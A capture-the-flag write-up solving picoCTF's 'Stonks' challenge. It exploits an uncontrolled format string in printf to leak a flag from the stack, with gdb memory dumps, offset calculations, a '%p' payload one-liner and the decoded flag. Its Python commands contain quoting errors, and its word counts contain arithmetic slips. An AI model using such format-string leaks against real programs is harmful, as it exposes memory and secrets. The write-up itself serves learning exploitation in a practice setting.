# Stonks
Category: Binary exploitation, 20 points

## Description

> I decided to try something noone else has before. I made a bot to
automatically trade stonks for me using AI and machine learning. I wouldn't
believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 16439

## Solution

After checking the connecting to the server, and looking into `vuln.c` we
notice that the `buy_stonks` function which accepts user's input, is using a
user provided string as a format string for a call of `printf`, specifically
this section of the code:

```
    char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
```

This is a [Uncontrolled format string](https://en.wikipedia.org/wiki/Uncontrolled_format_string) vulnerability.


In addition to that the flag is read in this same `buy_stonks` function from a
file:

```
    char api_buf[FLAG_BUFFER];
    printf("api_buf address: %p\n", api_buf);
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);
```

So the idea is to provide a format string that can show us the contents of
`api_buf`.

After a few experiments with the local version of the program, adding `%p`, we
know then what kind of string to supply that would allow us to check the
contents, but it would also need to be decoded into chars.

To do this I used gdb to debug the locally compiled program with debug
symbols, created a dummy flag file, and provided a bunch of `%p.` as the
format specifier to `printf` stored in `user_buf`.

Checking with gdb:

```
What would you like to do?
1) Buy some stonks!
2) View my portfolio
1

Breakpoint 1, buy_stonks (p=0x5555555592a0) at vuln.c:62
62      int buy_stonks(Portfolio *p) {
(gdb) n
91              printf("What is your API token?\n");
(gdb) x /s api_buf
0x7fffffffd4c0: "picoCTF{ahhh_32hfadf23}\n"
(gdb) x /xg api_buf
0x7fffffffd4c0: 0x7b4654436f636970
(gdb) x /xw api_buf
0x7fffffffd4c0: 0x6f636970
(gdb) x /3xb api_buf
0x7fffffffd4c0: 0x70    0x69    0x63
(gdb) x /3x api_buf
0x7fffffffd4c0: 0x70    0x69    0x63
(gdb) x /3xw api_buf
0x7fffffffd4c0: 0x6f636970      0x7b465443      0x68686861
(gdb) x /20xg $sp
0x7fffffffd490: 0x00007fffffffd4a0      0x00005555555592a0
0x7fffffffd4a0: 0x0000000100000000      0x00005555555596d0
0x7fffffffd4b0: 0x000055555555a980      0x000055555555a9a0
0x7fffffffd4c0: 0x7b4654436f636970      0x6832335f68686861
0x7fffffffd4d0: 0x0a7d333266646166      0x00007ffff7f73300
0x7fffffffd4e0: 0x00007ffff7ffd000      0x00007ffff7dfd119
0x7fffffffd4f0: 0x000000000000000a      0x00007ffff7dfd543
0x7fffffffd500: 0x0000000000000014      0x00007ffff7f725a0
0x7fffffffd510: 0x0000555555556161      0x00007ffff7df26fa
0x7fffffffd520: 0x0000000000000000      0x00007ffff7dbcced
```

Doing the math between where the flag is (0x7fffffffd4c0) and where the stack
pointer is (0x7fffffffd490) we can see that the difference is 0x30 or 48,
therefore we must insert something that prints at minimum the previous 48 bytes +
the length of the actual flag.
48 bytes in 8 byte words is 6 words. Since we don't know the length of the
flag, we must take the worst case which is that of the length of the flag
buffer, which is given in the code by the macro `FLAG_BUFFER` which is 128
bytes or 16 64-bit words, therefore we need to print to be safe to catch all
of the flag 16 + 8 words or 24, which can be done by injecting 24 '%p' in the
input.o

This can be done using python: 

```
python -c "print(f"%p." * 24 + "%p")
```

We can see that the actual contents shown by printf are:

```
0x1.0x1.0x7ffff7e79257.0x7ffff7f74570.0x7fffffff.0x7fffffffd4a0.0x5555555592a0.0x100000000.0x5555555596d0.0x55555555a960.0x55555555a980.0x7b4654436f636970.0x6832335f68686861.0xa7d333266646166.0x7ffff7f73300.0x7ffff7ffd000.0x7ffff7dfd119.0xa.0x7ffff7dfd543.0x14.0x7ffff7f725a0.0x555555556151.0x7ffff7df26fa.(nil).0x7ffff7dbcced97
```

We can verify from gdb that the contents of the flag start to appear 12 words
of 64-bit in, therefore we must amend our estimates to use 12 + 16 and use 38
64-bit words, but this assumes that the server is running a 64bit OS,
therefore it's better to take into account the number of bytes.

38 * 8 = 304 bytes that we need to read and starting from byte 96, we should
start to see the contents of the flag all things staying equal.


Doing this and examining the output we realize that the flag starts to appear at word 15
(32bit words), and considering the FLAG_BUFFER is 128 bytes that gives us 32
(32-bit) more words to read from that position onwards. That makes it 47 words
to read.

```
python -c "print(f"%p". * 47 + "%p")
```

Then we capture this and start decoding from the 15 word keeping in mind that
this is encoded using little endian. We do this up to the point where we find
a `\0` terminating the C-string.

```
0x8da1430.0x804b000.0x80489c3.0xf7efed80.0xffffffff.0x1.0x8d9f160.0xf7f0c110.0xf7efedc7.(nil).0x8da0180.0x3.0x8da1410.0x8da1430.0x6f636970.0x7b465443.0x306c5f49.0x345f7435.0x6d5f6c6c.0x306d5f79.0x5f79336e.0x62633763.0x65616336.0xfff7007d.0xf7f39af8.0xf7f0c440.0xa44c5d00.0x1.(nil).0xf7d9bce9.0xf7f0d0c0.0xf7efe5c0.0xf7efe000.0xfff70718.0xf7d8c68d.0xf7efe5c0.0x8048eca.0xfff70724.(nil).0xf7f20f09.0x804b000.0xf7efe000.0xf7efee20.0xfff70758.0xf7f26d50.0xf7eff890.0xa44c5d00.0xf7efe000.0x804b000.0xfff70758.0x8048c86.0x8d9f160.0xfff70744.0xfff70758.0x8048be9.0xf7efe3fc.(nil).0xfff7080c.0xfff70804.0x1.0x1.0x8d9f160.0xa44c5d00.0xfff70770.(nil).(nil).0xf7d41fa1.0xf7efe000.0xf7efe000.(nil).0xf7d41fa1.0x1.0xfff70804.0xfff7080c
```

This was done in the `main.py`

This CTF lead me through a rabbithole to refresh concepts I had seen back in
my studies of calling conventions, that explains how are parameters passed to
a procedure in assembly, how is the frame pointer, instruction pointer backed
up and restored, some of the common x86 register names, etc... as well as
keeping in mind the endianness of memory.

In addition something that was key to convincing me of what I was doing was
using gdb with the examine `x` command and experimenting with the options
there. 

Having said that I spent most of the time understating why gdb wouldn't show
the complete flag (or any complete word memory contents for that matter),
whenever I used `%x` format specifier like many write ups mentioned.

The explanation for that was done in the addendum
[gdb_debugging](./gdb_debugging.md) and is another hard lesson.


## Flag

picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}
